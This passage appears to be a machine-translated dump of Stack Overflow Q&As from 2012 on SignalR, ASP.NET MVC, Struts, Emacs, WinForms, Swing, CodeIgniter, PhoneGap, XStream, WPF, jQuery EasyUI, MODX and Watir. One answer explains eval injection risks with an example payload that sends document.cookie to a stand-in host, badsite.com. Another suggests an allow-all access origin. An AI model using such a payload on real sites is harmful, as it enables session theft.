                <table width="100%">
                    <tr>
                        <td>
                            <input type="text" id="msg" />
                        </td>
                        <td align="right" width="100px">
                            <input type="button" id="btn_send" class="button" value="Send" />
                        </td>
                    </tr>
                </table>
                </form>
            </div>
        </div>
    </div>
</div>

 <!--Add script to update the page and send messages.--> 
<script type="text/javascript">
    $(function () {
         var onlineUsers = null;
        var userList = [];
        var chat = $.connection.chatHub;

        var getUsers = function () {
            chat.server.getUsers().done(function (users) {
                onlineUsers = users;
                updateUserList();
            });
        };

        var updateUserList = function () {
            $('#users li').remove();
            userList = [];

            $.each(onlineUsers, function () {
                var listItem = $('<li>{0}</li>'.format(this.Name));
                $('#users').append(listItem);

                userList[this.Name] = User(this.Name, listItem);
            });
        };

        var send = function () {
            if ($('#msg').val() !== '') {
                chat.server.Send($('#msg').val());
                $("#msg").val('');
            }
        };

        var login = function () {
            if ($('#name').val() !== '') {
                clientName = $('#name').val();

                chat.server.Logon(clientName, function () {
                    $("#info").toggle();
                    $("#chat").toggle();
                    $('#msg').focus();
                    getUsers();
                }).fail(function (e) {
                    $('#login_error').html(e);
                });
            }
        };

        var logout = function () {
            chat.server.Logout();
        }

        // Callbacks from server
        chat.client.message = function (user, msg, time) {
            $('#message-list').append('<li class="message">{0} {1}: {2}</li>'.format(time, user, msg));
            $("#messages").prop({ scrollTop: $("#messages").prop("scrollHeight") });
        };

        chat.client.loggedOn = function (user, time) {
            $('#message-list').append('<li class="info">{0} {1} logged on</li>'.format(time, user));
            getUsers();
        };

        chat.client.loggedOff = function (user, time) {
            $('#message-list').append('<li class="info">{0} {1} logged off</li>'.format(time, user));
            getUsers();
        };

        chat.client.userTyping = function (user) {
            userList[user].typing();
        };

        // Form events
        $("#btn_send").click(function () { send(); $('#msg').focus(); });
        $("#btn_login").click(function () { login(); });
        $("#btn_logout").click(function () { logout(); });
        $('#chatform').submit(function () { send(); return false; });
        $('#startform').submit(function () { login(); return false; });

        // Logout when user closes browser
        window.onbeforeunload = function () { chat.server.Logout(); };

        // Start chat
        $.connection.hub.start().done(function () {
            alert("Connected");
        });

        $("#chat").toggle();
        $('#name').focus();

    });

</script> 
```

But I am getting following when I am trying to call `Logon` method of `ChatHub`:

> Uncaught TypeError: Object # has no method 'Logon'

Anyone help me where I am wrong in above coding with SignalR.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:50:39.590

当使用 SignalR 通过 JavaScript 与服务器方法通信时，除非通过`HubMethodName`属性指定，否则服务器方法被引用为 Camel Cased。

如果您想继续使用当前代码，您可以通过两种方式修复它。

1.  在您的服务器端集线器上`[HubMethodName("foo")]`，使用正确的名称放置在每个方法之上。所以登录将是：

    `[HubMethodName("Logon")] public void Logon(string clientName) { ... }`

2.  在 JavaScript 脚本中，您可以执行以下操作：

    `chat.server.logon(...);`

请记住，您必须将这些方法中的任何一种应用于所有方法（通过＃1）或与服务器的所有通信（通过＃2）。

希望这可以帮助！

# asp.net - 数据注解，为什么 boolean prop.IsRequired 总是等于 true

> ID：13957855
> 
> 赞同：2
> 
> 时间：2012-12-19T17:28:48.217
> 
> 标签：asp.net, asp.net-mvc, asp.net-mvc-4, data-annotations

我有一个模型包含一个没有`[Required]`属性的布尔值

```
public bool IsOptedIn { get; set; } 
```

我已`Object.cshtml`按如下方式覆盖并`@Html.EditorForModel()`用于生成我的表单

```
@{
    var properties = ViewData.ModelMetadata.Properties
                        .Where(prop => prop.ShowForEdit && !ViewData.TemplateInfo.Visited(prop));    
}

@foreach (var prop in properties)
{
    var hasModelStateError = ViewContext.ViewData.ModelState.Any(m => m.Key == prop.PropertyName) 
        && ViewContext.ViewData.ModelState[prop.PropertyName].Errors != null
        && ViewContext.ViewData.ModelState[prop.PropertyName].Errors.Count > 0;  
    <div class="control-group 
        @(hasModelStateError ? "error" : string.Empty) 
        @prop.PropertyName.ToLower()">
        @if (prop.IsReadOnly)
        {
            <b>@prop.GetDisplayName()</b>
            @Html.Display(prop.PropertyName)
        }
        else if (prop.HideSurroundingHtml)
        {
            @Html.Editor(prop.PropertyName)                    
        }
        else
        {
            <label class="control-label">
                @prop.GetDisplayName()
                @if (prop.IsRequired)
                {
                    <span class="required">*</span> 
                }            
            </label>                     
            <div class="controls">
                @Html.Editor(prop.PropertyName)             
                @if (hasModelStateError)
                {
                    <p class="alert alert-block">
                        @Html.ValidationMessage(prop.PropertyName)
                    </p>
                }
                @if (!string.IsNullOrWhiteSpace(prop.Description))
                {
                    <p class="help-block">
                        @prop.Description
                    </p>              
                }                    
            </div>
        }            
    </div>     
} 
```

我发现我的模型中的布尔值总是按要求标记。为什么会这样，我怎样才能阻止它发生？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-19T17:42:46.853

```
DataAnnotationsModelValidatorProvider.AddImplicitRequiredAttributeForValueTypes = false; 
```

将此行添加到您的`Application_Start`方法中`Global.asax`。默认情况下，MVC 将`[Required]`属性添加到不可为空的值类型（因为您不能将 a 转换`null`为 a `bool`，它必须是 a `bool`）。

# java - 如何在struts中过滤列表

> ID：13957858
> 
> 赞同：0
> 
> 时间：2012-12-19T17:28:58.563
> 
> 标签：java, jsp, struts

我正在创建并传递给我的 jsp 的数组列表是

```
ArrayList countryList = new ArrayList();
countryList.add(new CountryData("1", "USA"));
countryList.add(new CountryData("2", "Canada"));
countryList.add(new CountryData("3", "Mexico"));
countryList.add(new CountryData("4", "Canada")); 
```

在我正在使用的 jsp 页面上显示

```
<html:select property="country" >
<html:option value="0">Select Country</html:option>
<html:optionsCollection name="InputForm" property="countryList"
label="countryName" value="countryId" />
</html:select> 
```

是否可以过滤jsp上的列表以仅在下拉列表中显示加拿大

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:43:47.157

最简单的做法可能是将 CountryData 列表序列化为 JSON（使用无数免费的 Java JSON 库之一），并使用 JavaScript 过滤国家数组。

在 Java 中：

```
String countryListAsJSON = serialize(countryList);
request.setAttribute("countries", countryListAsJSON); 
```

在 JSP 中：

```
<script>
    var countries = ${countries};
    //...
</script> 
```

它将被翻译成以下 HTML 代码：

```
<script>
    var countries = [{"countryId": "1", "countryName": "USA"}, {"countryId": "2", "countryName": "Canada"}, ...];
    //...
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T10:55:54.160

是的，这是可能的，有几种方法可以做到：

1.  使用小脚本：（假设所有需要的包含指令都已完成）

    ```
    <%= List<CountryData> newList = new ArrayList<CountryData>(); %>
    <html:select property="country" >
    <html:option value="0">Select Country</html:option>
    <% 
         for(CountryData cd:countryList) {
             if("Canada".equals(cd.getCountry())) {
                 newList.add(cd);
             }
         }
    %>
    <html:optionsCollection name="InputForm" property="newList" label="countryName" value="countryId" />
    </html:select> 
    ```

2.  使用 JSTL`c:forEach`或`c:if`标签从列表中过滤掉所有不需要的元素

3.  使用专门开发的自定义标签从您的列表中过滤除“加拿大”以外的所有国家/地区

# emacs - 在 hippie-expand 中模拟 dabbrev-expand，限制匹配缓冲区

> ID：13957861
> 
> 赞同：2
> 
> 时间：2012-12-19T17:29:06.907
> 
> 标签：emacs, autocomplete, elisp, emacs24

如果我`dabbrev-expand`用于扩展，Emacs 会搜索当前缓冲区，然后搜索具有相同模式的其他缓冲区。这是`dabbrev-friend-buffer-function`由默认设置为处理的`dabbrev--same-major-mode-p`。

这工作正常，但我想使用`hippie-expand`.

```
(setq hippie-expand-try-functions-list
  '(try-expand-dabbrev
    try-expand-dabbrev-all-buffers)) 
```

这会从所有缓冲区中提取完成，即使是与我当前的主要模式不匹配的缓冲区。

如何使用`hippie-expand`仅来自使用与当前缓冲区相同主模式的缓冲区的 dabbrev 补全？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T18:11:54.650

快速而肮脏的解决方案：将函数的源代码复制`try-expand-dabbrev-all-buffers`到新位置，将其重命名 (say) `try-expand-dabbrev-all-buffers-same-mode`，并将表达式替换为`(buffer-list)`表达式：

```
(remove-if-not (lambda (x) (eq major-mode (with-current-buffer x major-mode)))
               (buffer-list)) 
```

（您需要`(require 'cl)`get `remove-if-not`，或者根据`mapcar`and重新实现它`delq`。）

然后，当然，替换`try-expand-dabbrev-all-buffers`为`try-expand-dabbrev-all-buffers-same-mode`in `hippie-expand-try-functions-list`。

你可以得到`try-expand-dabbrev-all-buffers`使用的来源`C-h``f`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T18:46:41.017

基于 Sean 的出色建议（并假设您安装了[dash.el](https://github.com/magnars/dash.el) list 实用程序库）：

```
(autoload '--filter "dash" nil t)

;; only consider buffers in the same mode with try-expand-dabbrev-all-buffers
(defun try-expand-dabbrev-matching-buffers (old)
  (let ((matching-buffers (--filter
                           (eq major-mode (with-current-buffer it major-mode))
                           (buffer-list))))
    (flet ((buffer-list () matching-buffers))
      (try-expand-dabbrev-all-buffers old)))) 
```

# c# - 将前缀设置为粗体并保留下划线

> ID：13957863
> 
> 赞同：0
> 
> 时间：2012-12-19T17:29:08.707
> 
> 标签：c#, winforms, richtextbox, rtf

我正在尝试将我的标题设置为粗体并保留下划线。例如：

![标题截图](../Images/55fa36ae9a0f0f8606c1242a7755a546.png)

代码不断使所有行加粗。从上图中可以看出，只有标题应该是粗体。如何修复代码以匹配图像？

```
 List<string> titles = new List<string> { "Basic Metabolic Panel", "Complete Blood Count", "Comprehensive Metabolic Panel" };
        List<string> bodies = new List<string> { " : Collected: 8/20/2012 5:45:00 PM", " : Collected: 8/20/2012 5:45:00 PM", " : Collected: 8/17/2012 4:18:00 AM" };

        for (int i = 0; i < titles.Count; i++)
        {
            string labName = titles[i];
            string collectionDate = bodies[i];
            int oldTextEndPoint = rtb.Text.Length;

            rtb.Text += labName + collectionDate + Environment.NewLine;

            rtb.Select(oldTextEndPoint, labName.Length + collectionDate.Length);
            rtb.SelectionFont = new Font(rtb.Font, rtb.SelectionFont.Style | FontStyle.Underline);

            rtb.Select(oldTextEndPoint, labName.Length);
            rtb.SelectionFont = new Font(rtb.Font, rtb.SelectionFont.Style | FontStyle.Bold);
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:36:29.887

问题是您将 SelectionFont 设置为基于 RTB 的默认字体的新字体，而不是基于当前的 SelectionFont。

尝试将其更改为：

```
rtb.Select(oldTextEndPoint, labName.Length + collectionDate.Length);
rtb.SelectionFont = new Font(rtb.SelectionFont, rtb.SelectionFont.Style | FontStyle.Underline);

rtb.Select(oldTextEndPoint, labName.Length);
rtb.SelectionFont = new Font(rtb.SelectionFont, rtb.SelectionFont.Style | FontStyle.Bold); 
```

编辑1：

我刚刚使用以下代码创建了一个简单的 Windows 应用程序，它同时使用粗体和下划线：

```
rtb.Text = "abcdefghijklmnopqrstuvwxyz";
rtb.Select(3, 10);
rtb.SelectionFont = new Font(rtb.SelectionFont, rtb.SelectionFont.Style | FontStyle.Bold);
rtb.Select(3, 5);
rtb.SelectionFont = new Font(rtb.SelectionFont, rtb.SelectionFont.Style | FontStyle.Underline); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:46:28.527

改变了

`rtb.Text += labName + collectionDate + Environment.NewLine;`

到

`rtb.AppendText(labName + collectionDate + Environment.NewLine);`

一切正常......

# java - 从其他类更改 JFrame 的标题

> ID：13957874
> 
> 赞同：4
> 
> 时间：2012-12-19T17:29:41.103
> 
> 标签：java, swing, jframe, jpanel, titlebar

我有两个类，一个 AnalogClock 类和一个 MainInterface 类。

我`timeChanged`在 AnalogClock 类中创建了一个方法，每当时间改变时都会调用它。我的 AnalogClock 基本上是一个带有绘图的 JPanel。在 MainInterface 中，我设置了一个 JFrame 并添加了我的 AnalogClock 的一个对象。

每当调用“timeChanged”时，是否可以更改我的窗口标题？我尝试使用`getParent()`or`getRootParent()`但他们不认识`setTitle()`.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T17:47:53.840

使用 [`getWindowAncestor`](http://docs.oracle.com/javase/6/docs/api/javax/swing/SwingUtilities.html#getWindowAncestor%28java.awt.Component%29) 方法从`SwingUtilities`.

```
//This gives you the first Window Object that contains the panel component
Window window = SwingUtilities.getWindowAncestor(panel);

//Cast it to JFrame
JFrame frame = (JFrame) window;

 //Now, change the title
frame.setTitle("New Title"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:42:53.340

最简单的方法是将 的引用传递`JFrame`给`JPanel`并调用`setTitle()`。使用`getParent()`，您将确定返回的正确类型，`Container`然后在找到`JFrame`参考后，将其转换为并调用`setTitle`.

我通常按​​照第一个建议去做。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:50:06.133

听起来`timeChanged`应该在你的`MainInterface`课堂上，因为`timeChanged`需要同时引用`AnalogClock`和`JFrame`。原因是您`AnalogClock`可能不应该与您的`JFrame`.

# codeigniter - codeigniter 中的分页和将值传递给函数不起作用

> ID：13957892
> 
> 赞同：-4
> 
> 时间：2012-12-19T17:30:38.283
> 
> 标签：codeigniter

控制器

```
public function category($id = '') {
    $offset=..;

    $var = $this->pm->get_items_by_category($id,$offset,$start_row);
} 
```

但在我看来，我有：

```
<li><a href="<?php echo site_url().'/welcome/category/2'; ?>">Mobile</a></li> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:52:48.513

我想我知道你想说什么，但不是很清楚。

您的链接需要通过限制和偏移量以及 id。所以做这样的事情

```
<li><a href="<?php echo site_url("welcome/category/$limit/$offset/$id");?>">Mobile</a></li> 
```

然后在你的控制器中像这样设置你的功能。

```
public function category($limit, $offset, $id){

} 
```

如果您提供更多信息，我可以给出更好的答案。

# android - 使用 PhoneGap View 在 Android 中打开 https://xyz.com Basic Auth 外部网站 url

> ID：13957893
> 
> 赞同：0
> 
> 时间：2012-12-19T17:30:39.470
> 
> 标签：android, cordova, https, android-webview, basic-authentication

我们如何在 phoneGap 视图中打开具有基本身份验证的外部站点 URL？

```
super.loadUrl("https://google.com"); //it works
super.loadUrl("https://xyz.com"); //this site has Basic Auth, it's not working & it is not giving authentication challenge (popup for credentials) 
```

我们如何通过凭证？现在我没有使用任何 phoneGap 功能，如果有其他方法可以让我继续。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T21:25:22.670

试试这个：编辑“res”文件夹中的“config.xml”文件，并用以下几行代替那里的内容

```
<access origin="http://127.0.0.1*"/> 
<access origin="https://xyz.com" /> 
<access origin="https://xyz.com" subdomains="true" />
<access origin=".*"/> 
```

# mobile - 提示用户在移动网站上安装/查看应用程序

> ID：13957894
> 
> 赞同：2
> 
> 时间：2012-12-19T17:30:45.197
> 
> 标签：mobile, mobile-safari

是否存在某种插件或轻量级方法来确定是否

A. 用户正在使用移动设备
B. 用户有特定的应用程序
C. 用户没有特定的应用程序。

并且根据用户满足的标准，显示一个提示（模式、覆盖、弹出），允许用户查看应用程序（如果已安装）或安装它（如果他们没有安装它）。

我意识到可以通过使用媒体查询来实现“A”，但我不确定如何配置其他查询。

我在很多网站上都看到过这种情况，所以我知道这并不少见（查看屏幕截图）。理想情况下，我只想实施一些快速的解决方案。我想我正在寻找类似于“Hello Bar”的移动设备。

任何帮助将不胜感激。

示例： http: [//i.imgur.com/VkWKu.png](http://i.imgur.com/VkWKu.png)（浏览器顶部的提示）

* * *

我最终找到了这个：

[http://developer.apple.com/library/ios/#documentation/AppleApplications/Reference/SafariWebContent/PromotingAppswithAppBanners/PromotingAppswithAppBanners.html](http://developer.apple.com/library/ios/#documentation/AppleApplications/Reference/SafariWebContent/PromotingAppswithAppBanners/PromotingAppswithAppBanners.html)

这正是我一直在寻找的，并将与其他解决方案协同工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:34:22.070

没有**标准**的方法可以做到这一点。

请参阅这篇文章的结尾：http: [//blogs.msdn.com/b/ieinternals/archive/2011/07/14/url-protocols-application-protocols-and-asynchronous-pluggable-protocols-oh-my.aspx](http://blogs.msdn.com/b/ieinternals/archive/2011/07/14/url-protocols-application-protocols-and-asynchronous-pluggable-protocols-oh-my.aspx)对于 IE10 中 JavaScript 可用的一种机制。

IE10 的 Metro 环境提供了这个：http: [//blogs.msdn.com/b/ie/archive/2011/10/20/connect-your-web-site-to-your-windows-8-app.aspx](http://blogs.msdn.com/b/ie/archive/2011/10/20/connect-your-web-site-to-your-windows-8-app.aspx)但我没有'认为移动浏览器不存在。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:50:18.200

如果您真的需要知道用户是否安装了您的应用程序，我会尝试这种方法。

当您的应用程序安装并首次运行时，让它创建一个 cookie。您唯一需要记住的是，`CookieSyncManager`因为设置的 Cookie 存储在 RAM 中而不是存储中，`CookieSyncManager`所以会同步这两个。

```
CookieSyncManager.createInstance(context)
CookieSyncManager.getInstance().sync() 
```

一旦你设置了 cookie，你就可以通过网站读取 cookie，如果它在那里显示弹出窗口等。哦，只有当它是移动设备时才显示这个弹出窗口：[http ://www.quirksmode.org/js/detect .html](http://www.quirksmode.org/js/detect.html)

CookieSyncManager 上的 Android 开发人员：http: [//developer.android.com/reference/android/webkit/CookieSyncManager.html](http://developer.android.com/reference/android/webkit/CookieSyncManager.html)

博尔格帖子解释 CookieSyncManager 的用法：http: [//blog.tacticalnuclearstrike.com/2010/05/using-cookiesyncmanager/](http://blog.tacticalnuclearstrike.com/2010/05/using-cookiesyncmanager/)

我知道如何使用 android 而不是 iOS 或 Windows 来做到这一点...

# java - xstream 反序列化返回 package.class@7dccc2。我假设我的别名不正确？

> ID：13957897
> 
> 赞同：0
> 
> 时间：2012-12-19T17:31:07.843
> 
> 标签：java, deserialization, alias, xstream, xml-deserialization

我正在尝试使用一个简单的 xml 文件来存储数据。我知道它矫枉过正，但我​​想我可以同时学习一些关于 xml 的知识。

我正在尝试在以下 xml 文件中读取值 1：

```
`<?xml version="1.0" encoding="UTF-8" standalone="no"?><invoiceNo>1</invoiceNo>` 
```

xml 数据的 getter/setter 类是：

```
`package com.InvoiceToAccounts.swt;

     public class XML_Log {
     public String invoiceNo;

     public void setNewInvoiceNo(String invoiceNo) {
        this.invoiceNo = invoiceNo;
        }

     public String getNewInvoiceNo() {
        return invoiceNo;
        }   
   }` 
```

我要读的课是：

```
`package com.InvoiceToAccounts.swt;

import java.io.FileInputStream;
import java.io.FileNotFoundException;
import com.thoughtworks.xstream.*;
import com.thoughtworks.xstream.io.xml.DomDriver;

public class XML_Reader {

    public String XRead(String logLocation) {

    XStream xs = new XStream(new DomDriver());
    XML_Log only1 = new XML_Log();
    xs.alias("invoiceNo", XML_Log.class);//Alias

try {

    FileInputStream fis = new FileInputStream(logLocation);//e.g."c:/temp/employeedata.txt"

    xs.fromXML(fis, only1);

    //print the data from the object that has been read
    System.out.println(only1.toString());

        } catch (FileNotFoundException ex) {
            ex.printStackTrace();
        }
        return (only1.toString());

    }
}` 
```

最后我从一个主要调用xml阅读器：

`//read log XML_Reader log1 = new XML_Reader(); String last_Invoice_No=log1.XRead("I:\\Invoice_Log.xml"); System.out.println("last_Invoice_no: " + last_Invoice_No);`

我的问题是 last_Invoice_No 收到的输出是：

`last_Invoice_no: com.InvoiceToAccounts.swt.XML_Log@7dccc2`

因此我认为这是我在 XML_Reader 类中所做的事情？

我已经阅读了关于别名的教程，并认为我的理解是正确的？

感谢您提前提供任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:35:57.350

> com.InvoiceToAccounts.swt.XML_Log@7dccc2

这意味着你没有给你的`XML_Log`类一个有意义的`toString`实现。你无法从中推断出其他任何东西。

尝试将此方法添加到 XML_Log。

```
public String toString() {
    return "XML_Log{ invoiceNo=" + invoiceNo + "}";
} 
```

# wpf - 向列表框项添加玻璃效果

> ID：13957900
> 
> 赞同：1
> 
> 时间：2012-12-19T17:31:15.790
> 
> 标签：wpf, listbox, listboxitem, aero-glass

我有一个带有背景图像的堆栈面板。在堆栈面板内有一个列表框，它的背景设置为透明，我需要的是仅对列表框项下的部分进行背景图像模糊（玻璃效果）。我尝试在列表框项目模板中将矩形添加到透明颜色，然后添加了模糊效果，但它不起作用。这就是我想要达到的目标。[![截屏](../Images/d4850f048c5eec03d9c7cefba4a4e7b2.png)](https://i.stack.imgur.com/l6mST.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T19:44:03.023

前段时间我遇到了[这个，也许会对你所追求的有所帮助。](http://jmorrill.hjtcentral.com/Home/tabid/428/EntryId/403/Glass-Behavior-for-WPF.aspx)

![在此处输入图像描述](../Images/3c1a05c8330e9de0f5987cb161695626.png)

# javascript - Web 浏览器存储：允许评估用户提供的字符串的安全隐患？

> ID：13957901
> 
> 赞同：2
> 
> 时间：2012-12-19T17:31:19.673
> 
> 标签：javascript, html, security, web-sql, indexeddb

我几乎完成了一个脚本的开发，该脚本公开了一个 API，该 API 可用于在任何 Web 浏览器存储技术上统一执行存储操作。

我正在处理的最后一点功能是条件检索和删除操作，（当然）需要提供一个条件表达式，该表达式将被评估（使用 eval() 或者在 webSQL 的情况下，直接插入在 WHERE 之后）。

我需要至少两个成熟的解析器（一个用于 webSQL，一个用于 indexedDB）来验证输入是否有效，但在安全评估之后，似乎不需要解析输入，甚至对其进行清理。

我有点不确定评估原始字符串的安全隐患，所以我希望能对我的安全评估提供一些意见：

> **用户：**
> 
> 评估用户直接或间接提供的输入应该不是问题，因为存储技术的 sanboxed 特性（他/她将操作只有他/她可以访问的给定来源的数据），并且事实上用户无法直接在浏览器中完成的 API 无法完成。
> 
> **第三方：**
> 
> 存储技术遵循同源策略，因此无法访问属于其他源的沙盒存储区域

我觉得我在评估中忽略了一个或多个可能的安全问题；是这样吗？还是评估（大部分）正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:27:05.890

真正相关的安全问题是*条件字符串的来源*。只要字符串始终来自用户，就没有风险——`eval`无论如何，用户都可以直接从 JS 控制台进行任何操作。一旦您允许字符串来自直接用户输入之外的某个地方，您就进入了危险的领域。

假设一个站点在其代码中使用您的 API 脚本。假设它们还允许您保存您最喜欢的搜索条件。进一步假设他们允许您与其他用户共享您最喜欢的搜索列表。当您查看共享条件时，您正在加载另一个用户提供的字符串。

假设您的一个向您发送了一个链接以查看他保存的条件：

```
foo==5; e=document.createElement(iframe); e.src='http://badsite.com/stealcookies?'+document.cookie;document.body.appendChild(e); 
```

当您将条件加载到您的数据查看器中时，您只是将您的 cookie 数据暴露给了另一个网站。

对于 WebSQL 注入（与`eval`.

# jquery - 在 jQuery EasyUI 组合框小部件中过滤值后单击绑定丢失

> ID：13957905
> 
> 赞同：0
> 
> 时间：2012-12-19T17:31:27.983
> 
> 标签：jquery, jquery-easyui

我有两个[jQuery EasyUI 组合框](http://www.jeasyui.com/documentation/combobox.php)，其中有一个项目列表。每个组合框都有完全相同的项目列表。我想要做的是，当我从第一个组合框中选择一个项目时，我希望所选项目在第二个组合框中不可用（反之亦然）。我通过使用 jQuery 的[replaceWith()](http://api.jquery.com/replaceWith/)方法来做到这一点，例如：

```
$('#old_element').replaceWith('#new_element'); 
```

[**从那个DEMO**](http://jsfiddle.net/rW24a/27/)可以看出，这很好用。但我遇到的问题是，当组合框中的项目被替换时，我不能再点击被替换的项目。例如，如果您在 combobox1 中选择 Java，Java 将从 combobox2 中删除（您只剩下 Perl 和 Ruby），现在如果您在 combobox1 中选择 Ruby，它会将 combobox2 中的 Ruby 替换为 combobox1 的旧值（即是 Java），但现在如果您尝试在 combobox2 中单击 Java，它不起作用（我无法单击）。谁能告诉我如何解决这种情况。当我将该列表中的一个元素替换为另一个元素时，似乎还有一些空的 div 被添加到列表中。知道如何解决这些问题吗？[](http://jsfiddle.net/rW24a/27/)

 **[**您可以在THAT DEMO**](http://jsfiddle.net/rW24a/27/)中查看代码[](http://jsfiddle.net/rW24a/27/)

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:43:59.053

你正在艰难地做这件事。为了简单起见，我将做两个假设来解释如何在不搞砸不应该使用的低级标记的情况下实现这一点。

1.  将您`data`的标记从标记移至 JavaScript。

    ```
    var data = [
      { label: 'java', value: 'Java' },
      { label: 'perl', value: 'Perl' },
      { label: 'ruby', value: 'Ruby' }
    ]; 
    ```

2.  我将假设两个组合框使用相同的`data`.

考虑到这一点，您可以使用`data`参数来初始化组合框。并且，在`onchange`事件中然后过滤掉合作伙伴组合框中的匹配项，使用该`loadData`方法设置过滤后的内容。

```
$cb1.add($cb2).combobox({
    data: data,
    onChange: function(newValue) {
        var $cb = $cb1.is(this) ? $cb2 : $cb1;
        $cb.combobox("loadData", data.filter(function(e) {
            return e.label !== newValue;
        }));
    }
}); 
```

[**看这里。**](http://jsfiddle.net/Z2nue/)

* * *

## 更新

无需修改 HTML 布局的替代方案。

```
var $cb1 = $('#combobox1'), $cb2 = $('#combobox2');

$cb1.data("combobox-data", $cb1.combobox("getData"));
$cb2.data("combobox-data", $cb2.combobox("getData"));

$cb1.add($cb2).combobox({
  onChange: function(newValue) {
    var $cb = $cb1.is(this) ? $cb2 : $cb1;
    var data = $cb.data("combobox-data");
    $cb.combobox("loadData", data.filter(function(e) {
      return e.label !== newValue;
    }));
  }
}); 
```

[**你去吧。**](http://jsfiddle.net/jH4M4/)****

# modx - modx 列出给定日期范围内发布的所有内容

> ID：13957909
> 
> 赞同：0
> 
> 时间：2012-12-19T17:31:44.853
> 
> 标签：modx, modx-revolution

我正在使用 modx advsearch 片段来列出搜索结果。

```
[[!AdvSearch?
&extractLength=`220`
&queryHook=`ArticleSearchQHook`
&extractEllipsis=`.`
&contexts=`web,tech,data,main`
&tpl=`articleSearchResult`
&perPage=`10`
&minChars=`2`
&withTVs=`docGroup,post_category,post_subcategory,category`
&fields=`pagetitle,longtitle,description,introtext,content,publishedon`]] 
```

我想显示在给定日期范围内发布的结果。所以我使用 2 个带有 datepicker 插件的文本框。我可以在 URl 中看到选定的日期，如下所示

```
pubfromdate=2012-11-01&pubtodate=2012-12-18&search=tech&sub=Search 
```

如何根据日期范围过滤结果？

还有另一个问题，如您所知，publishon 列以“时间戳”格式存储日期，我的文本字段接受“DMY”格式，但我认为这没什么大不了的，我可以处理这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T19:10:06.577

使用这个钩子`queryHook`

```
<?php

$andConditions = array();

if (!empty($_REQUEST['pubfromdate']) && $pubfromdate = strtotime($_REQUEST['pubfromdate'])) {
    $andConditions['modResource.publishedon:>'] = "{$pubfromdate}:numeric";
}

if (!empty($_REQUEST['pubtodate']) && $pubtodate = strtotime($_REQUEST['pubtodate'])) {
    $andConditions['modResource.publishedon:<'] = "{$pubtodate}:numeric";
}

if (!empty($andConditions)) {
    $qhDeclaration = array(
        'qhVersion' => '1.2',
        'andConditions' => $andConditions
    );
    $hook->setQueryHook($qhDeclaration);
}

return true; 
```

# php - CodeIgniter CMS 应用程序的多站点框架

> ID：13957910
> 
> 赞同：0
> 
> 时间：2012-12-19T17:31:47.593
> 
> 标签：php, codeigniter, content-management-system

我正在 CodeIgniter 框架之上构建一个应用程序。这将是我公司项目的个人 CMS。

我想做的是将应用程序与我们的客户能够访问我们网站的文件夹分开。本质上，我喜欢如下布局：

```
/applications
/system
/public_html
  - site1.com
  - site2.com
  - etc 
```

当有人点击 site1.com 时，它会使用 site1.com 的数据库配置来提取我为该网站概述的设置和信息，但从应用程序文件夹访问应用程序。

显然，这是从域返回几个级别，我之前遇到过这种布局的问题......我希望用户只需要担心他们文件夹中的以下内容（现在） ：

```
/site1.com
  - db.php (config file) 
```

他们将使用他们的信息更新 db.php，当有人访问 site1.com 时，他们将从应用程序文件夹中获取应用程序，并从他们的数据库中提取设置。最终，当我构建应用程序以允许这些事情时，我将为他们添加一种方法来上传他们网站独有的视图和资产。

所以...

**在为我的应用程序维护一个可以保留在服务器上的框架的同时，执行此操作的正确（和最佳）方法是什么？**

此外，如果您想提供一些有用的意见，那么这样做的优点和缺点是什么？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:55:09.730

旧但仍然相关-> [http://philsturgeon.co.uk/blog/2009/06/How-to-Multi-site-CodeIgniter-Set-up](http://philsturgeon.co.uk/blog/2009/06/How-to-Multi-site-CodeIgniter-Set-up)。基本思想是为每个域拥有相同的代码库。

# tinymce - webdriver tinymce content_formatselect

> ID：13957916
> 
> 赞同：1
> 
> 时间：2012-12-19T17:32:23.357
> 
> 标签：tinymce, webdriver

我正在尝试创建一个测试用例，在 tinymce 中选择一些文本，然后将样式从段落更改为标题。我有一些几乎可以工作的代码，但它必须运行两次才能正常工作。以下是逐步执行工具栏菜单第一行上每个按钮的代码的摘录。我想知道为什么我需要运行它两次。我可以在第一次悬停并单击期间看到下拉菜单下拉菜单，但除非我第二次运行代码，否则格式不会更改。

```
b.frame(id:"content_ifr").p.select_text "to try"

b.table(:id => 'content_formatselect').hover
b.table(:id => 'content_formatselect').click
b.span(:title => 'Heading 1').hover
b.span(:title => 'Heading 1').click

#second time 
b.table(:id => 'content_formatselect').hover
b.table(:id => 'content_formatselect').click
b.span(:title => 'Heading 1').hover
b.span(:title => 'Heading 1').click 
```

测试来自[http://www.tinymce.com/tryit/full.php](http://www.tinymce.com/tryit/full.php)页面。这里有更多的代码，在这一点上它是相当基本的，但它确实有效。我确实将跨度更改为 a 标签，但这并不影响结果。

```
require 'watir-webdriver'
require 'watir-webdriver/extensions/select_text'
#require 'test/unit'

b = Watir::Browser.new :firefox
b.goto "http://www.tinymce.com/tryit/full.php"

b.div(:id => 'main').wait_until_present

bodyy = b.textarea(:name => 'content').value

b.textarea(:value => /Feel free/).exists?

b.frame(id:"content_ifr").p.select_text "Feel free"

